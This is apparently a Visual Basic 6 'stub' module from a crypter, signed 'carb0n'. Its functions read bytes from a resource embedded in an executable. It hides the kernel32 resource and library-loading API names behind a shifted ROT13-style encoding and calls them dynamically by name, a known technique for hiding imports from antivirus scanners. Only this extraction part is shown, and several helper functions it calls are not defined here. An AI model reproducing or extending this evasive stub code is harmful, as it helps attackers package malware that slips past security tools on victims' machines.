Attribute VB_Name = "Module6"
'Stub by carb0n
'Last Modifications: June 23, 2009

Option Explicit

Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)

Public Function GetResData(ByVal ResType As Long, ByVal ResName As Long, Optional EXEPfad As String) As String
GetResData = BYTES_TO_STRING(GetResDataBytes(ResType, ResName, EXEPfad))
End Function

Public Function GetResDataBytes(ByVal ResType As Long, ByVal ResName As Long, Optional EXEPfad As String) As Byte()
Dim hMod As Long
Dim Text As String
Dim hRsrc As Long
Dim b() As Byte
Dim lpData As Long
Dim Size As Long
Dim hGlobal As Long

If EXEPfad = "" Or EXEPfad Like GetModuleName Or Dir(EXEPfad) = "" Then
hMod = App.hInstance
Else
hMod = CallAPIByName("kernel32", ROT13("Y|nqYvon†N", True), (EXEPfad))
End If

If hMod = 0 Then Exit Function
If IsNumeric(CLng(ResType)) Then hRsrc = CallAPIByName("kernel32", ROT13("Sv{q_r€|‚prN", True), CLng(hMod), ResName, CLng(ResType))
If hRsrc = 0 Then Exit Function
hGlobal = CallAPIByName("kernel32", ROT13("Y|nq_r€|‚pr", True), hMod, hRsrc)
lpData = CallAPIByName("kernel32", ROT13("Y|px_r€|‚pr", True), hGlobal)
Size = CallAPIByName("kernel32", ROT13("`v‡r|s_r€|‚pr", True), hMod, hRsrc)
If Size = 0 Then Exit Function
Text = Space(Size)
ReDim b(0 To Size - 1) As Byte

Call CopyMemory(b(0), ByVal lpData, Size)
Call CallAPIByName("kernel32", ROT13("Srr_r€|‚pr", True), hGlobal)
GetResDataBytes = b
hMod = CallAPIByName("kernel32", ROT13("SrrYvon†N", True))
End Function


